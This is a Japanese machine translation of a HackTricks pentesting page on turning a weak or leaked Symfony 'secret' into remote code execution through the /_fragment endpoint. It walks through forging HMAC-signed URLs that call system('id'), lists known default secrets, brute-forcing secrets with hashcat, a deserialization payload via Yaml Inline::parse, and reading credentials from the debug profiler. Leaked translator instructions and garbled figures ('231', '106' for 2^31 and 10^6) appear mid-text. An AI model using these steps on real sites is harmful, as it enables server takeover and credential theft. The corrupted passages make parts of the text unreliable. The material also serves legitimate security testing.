# Symfony

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。

- [**公式のPEASS＆HackTricks swag**](https://peass.creator-spring.com)を手に入れましょう。

- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**

- **ハッキングのトリックを共有するには、[hacktricks repo](https://github.com/carlospolop/hacktricks)と[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。

</details>

## はじめに <a href="#introduction" id="introduction"></a>

2008年の創設以来、[Symfony](https://symfony.com)フレームワークの使用は、PHPベースのアプリケーションでますます増えてきました。Symfonyは、[Drupal](https://www.drupal.org)、[Joomla！](https://www.joomla.org)、[eZPlatform](https://ezplatform.com)（以前のeZPublish）、[Bolt](https://bolt.cm)など、多くの有名なCMSのコアコンポーネントとなっており、カスタムウェブサイトの構築にもよく使用されます。

Symfonyの組み込み機能の1つである[ESI（Edge-Side Includes）](https://en.wikipedia.org/wiki/Edge\_Side\_Includes)を処理するために作成された[`FragmentListener`クラス](https://github.com/symfony/symfony/blob/5.1/src/Symfony/Component/HttpKernel/EventListener/FragmentListener.php)は、重要な役割を果たしています。実際、誰かが`/_fragment`にリクエストを発行すると、このリスナーは指定されたGETパラメータからリクエスト属性を設定します。これにより、**任意のPHPコードを実行**できるため、リクエストはHMAC値を使用して署名する必要があります。このHMACの秘密暗号鍵は、Symfonyの設定値である`secret`という名前で保存されます。

この設定値である`secret`は、CSRFトークンやremember-meトークンの作成にも使用されます。その重要性から明らかなように、この値は非常にランダムである必要があります。

残念ながら、デフォルト値を持つ場合や、値をオフラインでブルートフォースできる方法が存在する場合、または単純にセキュリティチェックをバイパスできる場合があります。これは、特にBolt、eZPlatform、eZPublishに影響を与えます。

これはささいな設定の問題のように思えるかもしれませんが、デフォルトの値、ブルートフォース可能な値、推測可能な値が、上記のCMSおよびカスタムアプリケーションで**非常に頻繁に存在する**ことがわかりました。これは、ドキュメントやインストールガイドでその重要性に十分な重点を置かないためです。

さらに、攻撃者は、ファイルの開示を介して`secret`を読み取る（ファイル開示を介して）、`/_fragment`の署名プロセスをバイパスする（SSRFを使用して）、さらには`phpinfo()`を介して漏洩させることさえできます！

このブログ記事では、さまざまなCMSおよび基本フレームワークで秘密を取得する方法、およびその秘密を使用してコードを実行する方法について説明します。

## 少しの歴史 <a href="#a-little-bit-of-history" id="a-little-bit-of-history"></a>

モダンなフレームワークであるSymfonyは、その創設から現在まで、リクエストのサブパーツを生成することに取り組んできました。`/_fragment`の前には、`/_internal`と`/_proxy`があり、基本的に同じことを行いました。これにより、年々多くの脆弱性が生じました：[CVE-2012-6432](https://symfony.com/blog/security-release-symfony-2-0-20-and-2-1-5-released#cve-2012-6432-code-execution-vulnerability-via-the-internal-routes)、[CVE-2014-5245](https://symfony.com/blog/cve-2014-5245-direct-access-of-esi-urls-behind-a-trusted-proxy)、[CVE-2015-4050](https://symfony.com/blog/cve-2015-4050-esi-unauthorized-access)など。

Symfony 4以降、秘密はインストール時に生成され、`/_fragment`ページはデフォルトで無効になっています。したがって、弱い`secret`と有効な`/_fragment`の組み合わせはまれであると思われるかもしれません。しかし、実際にはそうではありません。多くのフレームワークは古いSymfonyバージョンに依存しており（2.xも非常に一般的です）、静的な`secret`値を実装するか、適切に生成されていない値を生成します。さらに、多くのフレームワークはESIに依存しており、そのため`/_fragment`ページを有効にします。また、後述するように、他の影響の少ない脆弱性によって、安全に生成された場合でも秘密をダンプすることができます。

## `secret`の助けを借りてコードを実行する <a href="#executing-code-with-the-help-of-secret" id="executing-code-with-the-help-of-secret"></a>

まず、攻撃者が`secret`設定値の知識を持っている場合、コードの実行方法を示します。これは最新の`symfony/http-kernel`バージョンに対して行われますが、他のバージョンでも同様です。
### `/_fragment`を使用して任意のコードを実行する <a href="#using-_fragment-to-run-arbitrary-code" id="using-_fragment-to-run-arbitrary-code"></a>

前述の通り、`/_fragment`ページを利用します。
```php
# ./vendor/symfony/http-kernel/EventListener/FragmentListener.php

class FragmentListener implements EventSubscriberInterface
{
public function onKernelRequest(RequestEvent $event)
{
$request = $event->getRequest();

# [1]
if ($this->fragmentPath !== rawurldecode($request->getPathInfo())) {
return;
}

if ($request->attributes->has('_controller')) {
// Is a sub-request: no need to parse _path but it should still be removed from query parameters as below.
$request->query->remove('_path');

return;
}

# [2]
if ($event->isMasterRequest()) {
$this->validateRequest($request);
}

# [3]
parse_str($request->query->get('_path', ''), $attributes);
$request->attributes->add($attributes);
$request->attributes->set('_route_params', array_replace($request->attributes->get('_route_params', []), $attributes));
$request->query->remove('_path');
}
}
```
`FragmentListener:onKernelRequest`はすべてのリクエストで実行されます。もしリクエストのパスが `/_fragment` [1] である場合、メソッドはまずリクエストが有効であること（つまり、正しく署名されていること）を確認し、そうでない場合は例外を発生させます [2]。セキュリティチェックが成功した場合、メソッドはurlエンコードされた `_path` パラメータを解析し、それに応じて `$request` の属性を設定します。

リクエストの属性はHTTPリクエストパラメータと混同しないでください。それらはSymfonyによって維持される内部の値であり、通常はユーザーによって指定することはできません。これらのリクエスト属性の1つは `_controller` であり、どのSymfonyコントローラー（クラス、メソッドのタプル、または単純な関数）を呼び出すかを指定します。名前が `_` で始まらない属性は、コントローラーに渡される引数です。例えば、このメソッドを呼び出したい場合は、
```php
class SomeClass
{
public function someMethod($firstMethodParam, $secondMethodParam)
{
...
}
}
```
`_path`には次のように設定します：

`_controller=SomeClass::someMethod&firstMethodParam=test1&secondMethodParam=test2`

その後、リクエストは次のようになります：

`http://symfony-site.com/_fragment?_path=_controller%3DSomeClass%253A%253AsomeMethod%26firstMethodParam%3Dtest1%26secondMethodParam%3Dtest2&_hash=...`

基本的に、これにより、任意の関数やクラスの任意のメソッドを任意のパラメータで呼び出すことができます。Symfonyには多くのクラスがあるため、**コードの実行は簡単です**。例えば、`system()`を呼び出すことができます：

`http://localhost:8000/_fragment?_path=_controller%3Dsystem%26command%3Did%26return_value%3Dnull&_hash=...`

_システムの呼び出しは常に機能するわけではありません。詳細なエクスプロイトについては、エクスプロイトセクションを参照してください。_

問題が残っています：Symfonyはリクエストの署名をどのように検証するのでしょうか？

### URLの署名 <a href="#signing-the-url" id="signing-the-url"></a>

URLの署名を検証するために、_完全な_ URLに対してHMACが計算されます。得られたハッシュは、ユーザーが指定したハッシュと比較されます。

コード上では、これは2つの場所で行われます：
```php
# ./vendor/symfony/http-kernel/EventListener/FragmentListener.php

class FragmentListener implements EventSubscriberInterface
{
protected function validateRequest(Request $request)
{
// is the Request safe?
if (!$request->isMethodSafe()) {
throw new AccessDeniedHttpException();
}

// is the Request signed?
if ($this->signer->checkRequest($request)) {
return;
}

# [3]
throw new AccessDeniedHttpException();
}
}

# ./vendor/symfony/http-kernel/UriSigner.php

class UriSigner
{
public function checkRequest(Request $request): bool
{
$qs = ($qs = $request->server->get('QUERY_STRING')) ? '?'.$qs : '';

// we cannot use $request->getUri() here as we want to work with the original URI (no query string reordering)
return $this->check($request->getSchemeAndHttpHost().$request->getBaseUrl().$request->getPathInfo().$qs);
}

/**
* Checks that a URI contains the correct hash.
*
* @return bool True if the URI is signed correctly, false otherwise
*/
public function check(string $uri)
{
$url = parse_url($uri);
if (isset($url['query'])) {
parse_str($url['query'], $params);
} else {
$params = [];
}

if (empty($params[$this->parameter])) {
return false;
}

$hash = $params[$this->parameter];
unset($params[$this->parameter]);

# [2]
return hash_equals($this->computeHash($this->buildUrl($url, $params)), $hash);
}

private function computeHash(string $uri): string
{
# [1]
return base64_encode(hash_hmac('sha256', $uri, $this->secret, true));
}

private function buildUrl(array $url, array $params = []): string
{
ksort($params, SORT_STRING);
$url['query'] = http_build_query($params, '', '&');

$scheme = isset($url['scheme']) ? $url['scheme'].'://' : '';
$host = isset($url['host']) ? $url['host'] : '';
$port = isset($url['port']) ? ':'.$url['port'] : '';
$user = isset($url['user']) ? $url['user'] : '';
$pass = isset($url['pass']) ? ':'.$url['pass'] : '';
$pass = ($user || $pass) ? "$pass@" : '';
$path = isset($url['path']) ? $url['path'] : '';
$query = isset($url['query']) && $url['query'] ? '?'.$url['query'] : '';
$fragment = isset($url['fragment']) ? '#'.$url['fragment'] : '';

return $scheme.$user.$pass.$host.$port.$path.$query.$fragment;
}
}
```
簡単に言うと、Symfonyは`_hash` GETパラメータを抽出し、次に完全なURLを再構築します。例えば、`https://symfony-site.com/_fragment?_path=controller%3d...%26argument1=test%26...`のようなURLです。そして、このURLを`secret`をキーとしてHMACで計算し、与えられたハッシュ値と比較します\[1]。もし一致しない場合、`AccessDeniedHttpException`例外が発生し\[3]、`403`エラーが返されます。

### 例 <a href="#example" id="example"></a>

これをテストするために、テスト環境をセットアップし、シークレット（この場合はランダムに生成されたもの）を抽出しましょう。
```
$ git clone https://github.com/symfony/skeleton.git
$ cd skeleton
$ composer install
$ sed -i -E 's/#(esi|fragment)/\1/g' config/packages/framework.yaml # Enable ESI/fragment
$ grep -F APP_SECRET .env # Find secret
APP_SECRET=50c8215b436ebfcc1d568effb624a40e
$ cd public
$ php -S 0:8000
```
今、`http://localhost:8000/_fragment` を訪れると `403` エラーが表示されます。では、有効な署名を提供してみましょう:
```
$ php -r "echo(urlencode(base64_encode(hash_hmac('sha256', 'http://localhost:8000/_fragment', '50c8215b436ebfcc1d568effb624a40e', 1))) . PHP_EOL);"
lNweS5nNP8QCtMqyqrW8HIl4j9JXIfscGeRm%2FcmFOh8%3D
```
`http://localhost:8000/_fragment?_hash=lNweS5nNP8QCtMqyqrW8HIl4j9JXIfscGeRm%2FcmFOh8%3D`をチェックすると、`404`のステータスコードが返ってきます。シグネチャは正しいですが、リクエスト属性が指定されていないため、Symfonyは私たちのコントローラを見つけることができません。

任意の引数を持つ任意のメソッドを呼び出すことができるため、例えば`system($command, $return_value)`を選び、次のようなペイロードを提供することができます：
```
$ page="http://localhost:8000/_fragment?_path=_controller%3Dsystem%26command%3Did%26return_value%3Dnull"
$ php -r "echo(urlencode(base64_encode(hash_hmac('sha256', '$page', '50c8215b436ebfcc1d568effb624a40e', 1))) . PHP_EOL);"
GFhQ4Hr1LIA8mO1M%2FqSfwQaSM8xQj35vPhyrF3hvQyI%3D
```
以下は、ハッキング技術に関する本のコンテンツです。以下のコンテンツは、ファイル/hive/hacktricks/network-services-pentesting/pentesting-web/symphony.mdからのものです。関連する英語のテキストを日本語に翻訳し、翻訳を返し、マークダウンとHTMLの構文を完全に保持してください。コード、ハッキング技術の名前、ハッキングの言葉、クラウド/SaaSプラットフォームの名前（Workspace、aws、gcpなど）、'leak'という単語、ペンテスト、およびマークダウンタグなどのものは翻訳しないでください。また、翻訳とマークダウンの構文以外の追加のものは追加しないでください。

---

以下のエクスプロイトURLにアクセスできます：`http://localhost:8000/_fragment?_path=_controller%3Dsystem%26command%3Did%26return_value%3Dnull&_hash=GFhQ4Hr1LIA8mO1M%2FqSfwQaSM8xQj35vPhyrF3hvQyI%3D`。

`500`エラーにもかかわらず、**コマンドが実行されました**。

フラグメントを使用したRCE

![1](https://www.ambionics.io/images/symfony-secret-fragment/1.png)

## シークレットの検索 <a href="#finding-secrets" id="finding-secrets"></a>

繰り返しますが、シークレットが入手可能でなければ、これらのすべては重要ではありません。しばしば、それらは入手可能です。事前の知識なしにコードの実行を取得するためのいくつかの方法を説明します。

### 脆弱性を介して <a href="#through-vulnerabilities" id="through-vulnerabilities"></a>

まずは明らかなものから始めましょう：低影響の脆弱性を使用してシークレットを取得します。

#### ファイル読み取り <a href="#file-read" id="file-read"></a>

明らかに、ファイル読み取りの脆弱性を使用して、次のファイルを読み取り、`secret`を取得することができます：

* `app/config/parameters.yml`
* `.env`

_例えば、一部のSymfonyデバッグツールバーでは、ファイルの読み取りが可能です。_

#### PHPinfo <a href="#phpinfo" id="phpinfo"></a>

最近のSymfonyバージョン（3.x）では、`secret`は`.env`に`APP_SECRET`として保存されます。環境変数としてインポートされるため、`phpinfo()`ページを通じて確認することができます。

_phpinfoを通じてAPP\_SECRETを漏洩させる_

![2](https://www.ambionics.io/images/symfony-secret-fragment/2.png)

この方法は、スクリーンショットに示されているように、Symfonyのプロファイラパッケージを介して特に行うことができます。

#### SSRF / IPスプーフィング（CVE-2014-5245） <a href="#ssrf-ip-spoofing-cve-2014-5245" id="ssrf-ip-spoofing-cve-2014-5245"></a>

`FragmentListener`のコードは年々進化してきました。バージョン2.5.3まで、リクエストが信頼されたプロキシ（つまり`localhost`）から来た場合、安全と見なされ、そのためハッシュはチェックされませんでした。たとえば、SSRFを使用すると、`secret`の有無に関係なく、コードを直ちに実行することができます。これは、特にeZPublishが2014.7までに影響を受けます。
```php
# ./vendor/symfony/symfony/src/Symfony/Component/HttpKernel/EventListener/FragmentListener.php
# Symfony 2.3.18

class FragmentListener implements EventSubscriberInterface
{
protected function validateRequest(Request $request)
{
// is the Request safe?
if (!$request->isMethodSafe()) {
throw new AccessDeniedHttpException();
}

// does the Request come from a trusted IP?
$trustedIps = array_merge($this->getLocalIpAddresses(), $request->getTrustedProxies());
$remoteAddress = $request->server->get('REMOTE_ADDR');
if (IpUtils::checkIp($remoteAddress, $trustedIps)) {
return;
}

// is the Request signed?
// we cannot use $request->getUri() here as we want to work with the original URI (no query string reordering)
if ($this->signer->check($request->getSchemeAndHttpHost().$request->getBaseUrl().$request->getPathInfo().(null !== ($qs = $request->server->get('QUERY_STRING')) ? '?'.$qs : ''))) {
return;
}

throw new AccessDeniedHttpException();
}

protected function getLocalIpAddresses()
{
return array('127.0.0.1', 'fe80::1', '::1');
}
```
### デフォルト値を通じて <a href="#through-default-values" id="through-default-values"></a>

#### Symfony <= 3.4.43: `ThisTokenIsNotSoSecretChangeIt` <a href="#symfony-3443-thistokenisnotsosecretchangeit" id="symfony-3443-thistokenisnotsosecretchangeit"></a>

Symfonyのウェブサイトをセットアップする際、最初のステップは[symfony-standard](https://github.com/symfony/symfony-standard)スケルトンをインストールすることです。インストールされると、プロンプトがいくつかの設定値を要求します。デフォルトでは、キーは`ThisTokenIsNotSoSecretChangeIt`です。

_composerを通じたSymfonyのインストール_

![3](https://www.ambionics.io/images/symfony-secret-fragment/3.png)

後のバージョン（4以上）では、シークレットキーは安全に生成されます。

#### ezPlatform 3.x（最新）: `ff6dc61a329dc96652bb092ec58981f7` <a href="#ezplatform-3x-latest-ff6dc61a329dc96652bb092ec58981f7" id="ezplatform-3x-latest-ff6dc61a329dc96652bb092ec58981f7"></a>

[ezPlatform](https://ezplatform.com)は、[ezPublish](https://en.wikipedia.org/wiki/EZ\_Publish)の後継であり、まだSymfonyを使用しています。2019年6月10日に、[commit](https://github.com/ezsystems/ezplatform/commit/974f2a70d9d0507ba7ca17226693b1a4967f23cf#diff-f579cccc964135c7d644c7b2d3b0d3ecR59)がデフォルトキーを`ff6dc61a329dc96652bb092ec58981f7`に設定しました。脆弱なバージョンは3.0-alpha1から3.1.1（現在のバージョン）までです。

[ドキュメント](https://doc.ezplatform.com/en/latest/getting\_started/install\_ez\_platform/#change-installation-parameters)では、シークレットを変更する必要があると記載されていますが、強制されていません。

#### ezPlatform 2.x: `ThisEzPlatformTokenIsNotSoSecret_PleaseChangeIt` <a href="#ezplatform-2x-thisezplatformtokenisnotsosecret_pleasechangeit" id="ezplatform-2x-thisezplatformtokenisnotsosecret_pleasechangeit"></a>

Symfonyのスケルトンと同様に、インストール中にシークレットを入力するように求められます。デフォルト値は`ThisEzPlatformTokenIsNotSoSecret_PleaseChangeIt`です。

#### Bolt CMS <= 3.7（最新）: `md5(__DIR__)` <a href="#bolt-cms-37-latest-md5__dir__" id="bolt-cms-37-latest-md5__dir__"></a>

[Bolt CMS](https://bolt.cm)は、Symfonyに基づく非推奨のマイクロフレームワークである[Silex](https://github.com/silexphp/Silex)を使用しています。この計算を使用してシークレットキーを設定します：
```php
# ./vendor/silex/silex/src/Silex/Provider/HttpFragmentServiceProvider.php
$app['uri_signer.secret'] = md5(__DIR__);

# ./vendor/silex/silex/src/Silex/Provider/FormServiceProvider.php
$app['form.secret'] = md5(__DIR__);
```
したがって、秘密を推測するか、Full Path Disclosureの脆弱性を使用して計算することができます。

デフォルトの秘密キーで成功しなかった場合、あきらめないでください：他の方法もあります。

### ブルートフォース <a href="#bruteforce" id="bruteforce"></a>

秘密はしばしば手動で設定されるため（ランダムに生成されるのではなく）、人々は安全なランダムな値の代わりにパスフレーズを使用することがよくあります。そのため、ハッシュをブルートフォースするための有効な `/_fragment` URL（Symfonyによって生成されたものなど）があれば、秘密をブルートフォースすることができます。

_レスポンスにはフラグメントへの有効なリクエストが含まれています_

![4](https://www.ambionics.io/images/symfony-secret-fragment/4.png)

このブログポストの冒頭で、Symfonyの秘密にはいくつかの用途があると述べました。その用途の1つは、CSRFトークンを生成するためにも使用されることです。`secret`のもう1つの用途は、remember-meクッキーに署名することです。場合によっては、攻撃者は独自のCSRFトークンまたはremember-meクッキーを使用して、`secret`の値をブルートフォースすることができます。

_これらのトークンの構築のリバースエンジニアリングは、読者にとっての演習として残されています。_

### さらに進む：eZPublish <a href="#going-further-ezpublish" id="going-further-ezpublish"></a>

コード実行を達成するために、秘密をブルートフォースする方法を見るために、eZPublish 2014.07の秘密を見つける方法を見てみましょう。

#### ブルートフォース素材の見つけ方 <a href="#finding-bruteforce-material" id="finding-bruteforce-material"></a>

eZPublishは、次のようにCSRFトークンを生成します：
```php
# ./ezpublish_legacy/extension/ezformtoken/event/ezxformtoken.php
self::$token = sha1( self::getSecret() . self::getIntention() . session_id() );
```
このトークンを構築するために、eZPは2つの既知の値とシークレットを使用します：`getIntention()`はユーザーが試みているアクション（たとえば`authenticate`）です。`session_id()`はPHPセッションIDです。そして、`getSecret()`はSymfonyの`secret`です。

CSRFトークンは一部のフォームに存在するため、シークレットをブルートフォースできる材料が手に入りました。

残念ながら、ezPublishはsensiolabsのバンドル、[sensio/distribution-bundle](https://packagist.org/packages/sensio/distribution-bundle)を組み込んでいます。このパッケージはシークレットキーがランダムであることを確認します。インストール時に次のように生成されます：
```php
# ./vendor/sensio/distribution-bundle/Sensio/Bundle/DistributionBundle/Configurator/Step/SecretStep.php

private function generateRandomSecret()
{
return hash('sha1', uniqid(mt_rand()));
}
```
以下は、/hive/hacktricks/network-services-pentesting/pentesting-web/symphony.mdというファイルからのコンテンツです。関連する英語のテキストを日本語に翻訳し、翻訳を保持して同じマークダウンとHTMLの構文を返してください。コード、ハッキング技術の名前、ハッキングの言葉、クラウド/SaaSプラットフォームの名前（Workspace、aws、gcpなど）、'leak'という単語、ペンテスト、およびマークダウンタグなどは翻訳しないでください。また、翻訳とマークダウンの構文以外の追加の要素は追加しないでください。

```markdown
This looks really hard to bruteforce: `mt_rand()` can yield 231 different values, and `uniqid()` is built from the current timestamp (with microseconds).
```

```html
これは本当にブルートフォースが難しいようです：`mt_rand()`は231個の異なる値を生成する可能性があり、`uniqid()`は現在のタイムスタンプ（マイクロ秒単位）から構築されています。
```
```php
// Simplified uniqid code

struct timeval tv;
gettimeofday(&tv, NULL);
return strpprintf(0, "%s%08x%05x", prefix, tv.tv_sec, tv.tv_usec);
```
#### タイムスタンプの漏洩 <a href="#disclosing-the-timestamp" id="disclosing-the-timestamp"></a>

幸運なことに、この秘密はインストールの最後のステップで生成されます。ウェブサイトが設定された直後に生成されるため、おそらくこのハッシュを生成するために使用されるタイムスタンプを漏洩させることができるでしょう。

その方法の一つは、ログ（例：`/var/log/storage.log`）を使用することです。キャッシュエントリが作成された最初の時間を漏洩させることができます。キャッシュエントリは、`generateRandomSecret()`が呼び出された直後に作成されます。

_サンプルログの内容：タイムスタンプは、シークレットの計算に使用されるものと似ています_

![5](https://www.ambionics.io/images/symfony-secret-fragment/5.png)

ログが利用できない場合、eZPublishの非常に強力な検索エンジンを使用して、ウェブサイトの最初の要素の作成時刻を見つけることができます。実際、サイトが作成されると、データベースに多くのタイムスタンプが入力されます。これは、eZPublishウェブサイトの初期データのタイムスタンプが`uniqid()`を計算するために使用されるものと同じであることを意味します。`landing_page`の_ContentObject_を検索し、そのタイムスタンプを調べることができます。

## 欠落している部分のブルートフォース <a href="#bruteforcing-the-missing-bits" id="bruteforcing-the-missing-bits"></a>

今、シークレットを計算するために使用されるタイムスタンプと、次の形式のハッシュについて知ることができました：
```php
$random_value = mt_rand();
$timestamp_hex = sprintf("%08x%05x", $known_timestamp, $microseconds);
$known_plaintext = '<intention><sessionID>';
$known_hash = sha1(sha1(mt_rand() . $timestamp_hex) . $known_plaintext);
```
これにより、合計231 * 106の可能性が残ります。[hashcat](https://hashcat.net)と優れたGPUセットを使用すれば、実現可能ですが、hashcatには`sha1(sha1($pass).$salt)`カーネルが提供されていません。幸いなことに、私たちはそれを実装しました！[ここでプルリクエストを見つけることができます](https://github.com/hashcat/hashcat/pull/2536)。

私たちのクラッキングマシンは8つのGPUを搭載しており、このハッシュを「20時間未満」でクラックすることができます。

ハッシュを取得した後、`/_fragment`を使用してコードを実行することができます。

## 結論 <a href="#conclusion" id="conclusion"></a>

Symfonyは現在、多くのPHPアプリケーションの中核コンポーネントとなっています。そのため、フレームワークに影響を与えるセキュリティリスクは多くのウェブサイトに影響を与えます。この記事で示されているように、弱いシークレットまたは影響の少ない脆弱性により、攻撃者は**リモートコード実行**を行うことができます。

ブルーチームのメンバーとして、Symfonyに依存しているウェブサイトをすべて確認する必要があります。最新のソフトウェアでも脆弱性が排除されることはありません。なぜなら、シークレットキーは製品の最初のインストール時に生成されるからです。したがって、数年前にSymfony 3.xベースのウェブサイトを作成し、途中でアップデートを続けた場合、シークレットキーはデフォルトのままである可能性があります。

## 悪用 <a href="#exploitation" id="exploitation"></a>

### 理論 <a href="#theory" id="theory"></a>

この脆弱性を悪用する際に心配することがいくつかあります：

* HMACは**完全なURL**を使用して計算されます。ウェブサイトがリバースプロキシの背後にある場合、ペイロードを送信するURLではなく、サービスの内部URLを使用する必要があります。たとえば、内部URLはHTTPSではなくHTTPである場合があります。
* HMACのアルゴリズムは年々変わってきました。以前は**SHA-1**でしたが、現在は**SHA-256**です。
* Symfonyはリクエストから`_hash`パラメータを削除し、その後URLを再生成するため、私たちは同じURLでハッシュを計算する必要があります。
* 多くのシークレットが使用されるため、すべてをチェックする必要があります。
* 一部のPHPバージョンでは、「参照渡し」パラメータを持つ関数（例：`system($command, &$return_value)`）を呼び出すことができません。
* 一部のSymfonyバージョンでは、`_controller`は関数ではなくメソッドである必要があります。コードを実行するためのSymfonyのメソッドを見つける必要があります。

一方、次のようなことを利用することができます：

* パラメータなしで`/_fragment`にアクセスするか、無効なハッシュでアクセスすると`403`が返されます。
* 有効なハッシュで`/_fragment`にアクセスするが、有効なコントローラがない場合は`500`が返されます。

最後のポイントにより、後続でどの関数またはメソッドを呼び出すかを心配することなく、シークレットの値をテストすることができます。

### 実践 <a href="#practice" id="practice"></a>

攻撃対象が`https://target.com/_fragment`であるとします。URLを正しく署名するためには、次の情報が必要です：

* 内部URL：`https://target.com/_fragment`、または`http://target.com/_fragment`、または別の完全に異なるもの（例：`http://target.website.internal`）など、推測できないもの
* シークレットキー：`ThisTokenIsNotSoSecretChangeIt`、`ThisEzPlatformTokenIsNotSoSecret_PleaseChangeIt`などの一般的なシークレットキーのリスト
* アルゴリズム：SHA1またはSHA256

実際のペイロード（`_path`の内容）については心配する必要はありません。なぜなら、正しく署名されたURLは`AccessDeniedHttpException`がスローされず、したがって`403`が返されないからです。この脆弱性では、各（アルゴリズム、URL、シークレット）の組み合わせを試し、URLを生成し、`403`のステータスコードが返されないかどうかを確認します。

_パラメータなしでの`/_fragment`への有効なリクエスト_

![6](https://www.ambionics.io/images/symfony-secret-fragment/6.png)

この時点で、任意の`/_fragment` URLに署名することができるため、RCEが保証されます。呼び出すものは問題ではありません。

次に、関数を直接呼び出すことができるか、クラスメソッドを使用する必要があるかを調べる必要があります。最初に、最も直接的な方法で、`phpinfo ([ int $what = INFO_ALL ] )`（[ドキュメント](https://www.php.net/manual/en/function.phpinfo.php)）などの関数を使用して試すことができます。`_path` GETパラメータは次のようになります：
```
_controller=phpinfo
&what=-1
```
そして、URLは次のようになります：

`http://target.com/_fragment?_path=_controller%3Dphpinfo%26what%3D-1&_hash=...`

もしHTTPレスポンスが`phpinfo()`ページを表示するなら、成功です。その後、`assert`などの別の関数を試してみることができます：

`_controller=assert`を使用したサンプル出力

![7](https://www.ambionics.io/images/symfony-secret-fragment/7.png)

そうでない場合、クラスメソッドを使用する必要があります。これには`Symfony\Component\Yaml\Inline::parse`が適しています。これはSymfonyの組み込みクラスであり、Symfonyのウェブサイトには必ず存在します。

明らかに、このメソッドはYAML入力文字列を解析します。Symfonyの[YAML](https://yaml.org)パーサーは`php/object`タグをサポートしており、これによりシリアライズされた入力文字列を`unserialize()`を使用してオブジェクトに変換することができます。これにより、お気に入りのPHPツールである[PHPGGC](https://github.com/ambionics/phpggc)を使用することができます！

このメソッドのプロトタイプは年々変わってきています。例えば、以下に3つの異なるプロトタイプを示します：
```
public static function parse($value, $flags, $references);
public static function parse($value, $exceptionOnInvalidType, $objectSupport);
public static function parse($value, $exceptionOnInvalidType, $objectSupport, $objectForMap, $references);
```
これらのそれぞれに`_path`を構築する代わりに、メソッドのプロトタイプと一致しない名前の引数を渡すと、無視されるという事実を利用することができます。したがって、実際のプロトタイプを気にすることなく、すべての可能な引数をメソッドに追加することができます。

したがって、次のように`_path`を構築することができます：
```
_controller=Symfony\Component\Yaml\Inline::parse
&value=!php/object O:32:"Monolog\Handler\SyslogUdpHandler":...
&flags=516
&exceptionOnInvalidType=0
&objectSupport=1
&objectForMap=0
&references=
&flags=516
```
再度、`phpinfo()`を試してみて、うまくいくかどうか確認しましょう。もし成功した場合は、代わりに`system()`を使用できます。

_シリアライズされたペイロードを使用した`Inline::parse`のサンプル出力_

![8](https://www.ambionics.io/images/symfony-secret-fragment/8.png)

したがって、このエクスプロイトはすべての可能な変数の組み合わせを実行し、その後、2つのエクスプロイト方法を試します。コードは[GitHub](https://github.com/ambionics/symfony-exploits)で利用できます。

## symfony /\_profiler情報へのアクセス

上記のスクリーンショットを見ると、ページの右下に`sf`のロゴが表示されています。このロゴは、Symfonyがデバッグモードである場合に表示されます。このロゴが表示されない場合もあるため、`/_profiler`にアクセスして以下のようなページが表示されるか確認してください。

![f:id:flattsecurity:20201021204605p:plain](https://cdn-ak.f.st-hatena.com/images/fotolife/f/flattsecurity/20201021/20201021204605.png)

この機能はSymfony Profilerと呼ばれ、インターネット上でこの機能についてはあまり情報がありません。この機能の意図は明確です。エラーやバグが発生した場合にデバッグを支援します。もちろん、この機能はデバッグモードが有効な場合にのみ使用できます。

Symfonyフレームワーク自体は非常に安全ですが、デバッグモードを有効にすると、このフレームワークは非常に脆弱になります。たとえば、ProfilerにはProfile Searchという機能があります。以下のスクリーンショットに示すように。

![f:id:flattsecurity:20201021204624p:plain](https://cdn-ak.f.st-hatena.com/images/fotolife/f/flattsecurity/20201021/20201021204624.png)

上記のスクリーンショットでわかるように、サーバーに送信されたすべてのリクエストにアクセスできます。トークン内のハッシュをクリックすると、以下のスクリーンショットに示すように、すべてのPOSTパラメータを読み取ることができます。この機能を使用することで、管理者やユーザーのアカウントの資格情報を乗っ取ることができます。

![f:id:flattsecurity:20201021204637p:plain](https://cdn-ak.f.st-hatena.com/images/fotolife/f/flattsecurity/20201021/20201021204637.png)

### 他のデバッグが有効なエンドポイント

以下のURLもチェックする必要があります：

* **https://example.com/app\_dev.php/\_profiler**
* **https://example.com/app\_dev.php**\\

## 参考文献

* [**https://www.ambionics.io/blog/symfony-secret-fragment**](https://www.ambionics.io/blog/symfony-secret-fragment)
* [**https://flattsecurity.hatenablog.com/entry/2020/11/02/124807**](https://flattsecurity.hatenablog.com/entry/2020/11/02/124807)
* [**https://infosecwriteups.com/how-i-was-able-to-find-multiple-vulnerabilities-of-a-symfony-web-framework-web-application-2b82cd5de144**](https://infosecwriteups.com/how-i-was-able-to-find-multiple-vulnerabilities-of-a-symfony-web-framework-web-application-2b82cd5de144)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ企業で働いていますか？ HackTricksであなたの会社を宣伝したいですか？または、PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロードしたりしたいですか？ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！**

